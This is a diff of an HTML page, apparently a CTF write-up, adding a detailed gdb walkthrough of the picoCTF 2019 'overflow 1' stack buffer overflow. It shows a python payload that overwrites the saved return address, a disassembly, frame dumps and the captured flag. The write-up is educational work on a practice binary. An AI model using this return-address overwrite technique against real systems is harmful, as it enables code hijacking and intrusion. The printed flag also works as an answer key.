@@ -88,4 +88,74 @@ samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*7
 Give me a string and lets see what happens: 
 Woah, were jumping to 0x80485e6 !
 picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
-</code></pre><h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}</code></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_0.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-overflow_2.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/picoctf19-overflow_0.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a href=../../ctf/binary/picoctf19-overflow_2.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
+</code></pre><h2><a class=header href=#more-detailed-explanation id=more-detailed-explanation>More detailed explanation</a></h2><p>So why did that work? We won't have a nice function that tells us the return address all the time.<p>In x86 assembly, the memory address of where a program is returning to is held in the <code>ebp</code> register, otherwise known as the base pointer. So let's try to see if we can match the register value to what the function prints out for us<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ ./vuln 
+Give me a string and lets see what happens: 
+picoCTF
+Woah, were jumping to 0x8048705 !
+samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
+... &lt;redacted&gt;
+
+(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
+Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x8048705 !
+[Inferior 1 (process 2891586) exited normally]
+
+(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
+Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x80485e6 !
+Flag File is Missing. please contact an Admin if you are running this on the shell server.
+[Inferior 1 (process 2891439) exited normally]
+</code></pre><p>Just verifying we can send in input through GDB.<pre><code class=language-bash>(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x0804865f &lt;+0&gt;:     push   %ebp
+   0x08048660 &lt;+1&gt;:     mov    %esp,%ebp
+   0x08048662 &lt;+3&gt;:     push   %ebx
+   0x08048663 &lt;+4&gt;:     sub    $0x44,%esp
+   0x08048666 &lt;+7&gt;:     call   0x8048520 &lt;__x86.get_pc_thunk.bx&gt;
+   0x0804866b &lt;+12&gt;:    add    $0x1995,%ebx
+   0x08048671 &lt;+18&gt;:    sub    $0xc,%esp
+   0x08048674 &lt;+21&gt;:    lea    -0x48(%ebp),%eax
+   0x08048677 &lt;+24&gt;:    push   %eax
+   0x08048678 &lt;+25&gt;:    call   0x8048430 &lt;gets@plt&gt;
+   0x0804867d &lt;+30&gt;:    add    $0x10,%esp
+   0x08048680 &lt;+33&gt;:    call   0x8048714 &lt;get_return_address&gt;
+   0x08048685 &lt;+38&gt;:    sub    $0x8,%esp
+   0x08048688 &lt;+41&gt;:    push   %eax
+   0x08048689 &lt;+42&gt;:    lea    -0x17f9(%ebx),%eax
+   0x0804868f &lt;+48&gt;:    push   %eax
+   0x08048690 &lt;+49&gt;:    call   0x8048420 &lt;printf@plt&gt;
+   0x08048695 &lt;+54&gt;:    add    $0x10,%esp
+   0x08048698 &lt;+57&gt;:    nop
+   0x08048699 &lt;+58&gt;:    mov    -0x4(%ebp),%ebx
+   0x0804869c &lt;+61&gt;:    leave  
+   0x0804869d &lt;+62&gt;:    ret    
+End of assembler dump.
+</code></pre><p>We know the <code>call 0x8048430 &lt;gets@plt></code> is where the assembly code gets user input so lets view the important bits of the stack change as we step through it after setting a breakpoint right before it.<pre><code class=language-bash>(gdb) b* 0x08048678
+Breakpoint 1 at 0x8048678
+(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
+Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
+Give me a string and lets see what happens: 
+
+Breakpoint 1, 0x08048678 in vuln ()
+(gdb) info frame
+Stack level 0, frame at 0xffde0df0:
+ eip = 0x8048678 in vuln; saved eip = 0x8048705
+ called by frame at 0xffde0e20
+ Arglist at 0xffde0de8, args: 
+ Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
+ Saved registers:
+  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
+</code></pre><p>Note the output: <code>saved eip = 0x8048705</code>. As we know the EIP is the instruction pointer that the allows to the CPU to remember where to jump to after returning from a function.<p>Let's step through with the <code>next instruction</code> command and watch what happens after the program receives our input.<pre><code class=language-bash>(gdb) ni
+0x0804867d in vuln ()
+(gdb) i f
+Stack level 0, frame at 0xffde0df0:
+ eip = 0x804867d in vuln; saved eip = 0x80485e6
+ called by frame at 0x41414149
+ Arglist at 0xffde0de8, args: 
+ Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
+ Saved registers:
+  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
+</code></pre><p>There we go. We overwrote the old value of the eip and now the program should technically jump wherever we want, in our case the address of the flag.<h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}</code></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_0.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-overflow_2.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/picoctf19-overflow_0.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a href=../../ctf/binary/picoctf19-overflow_2.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
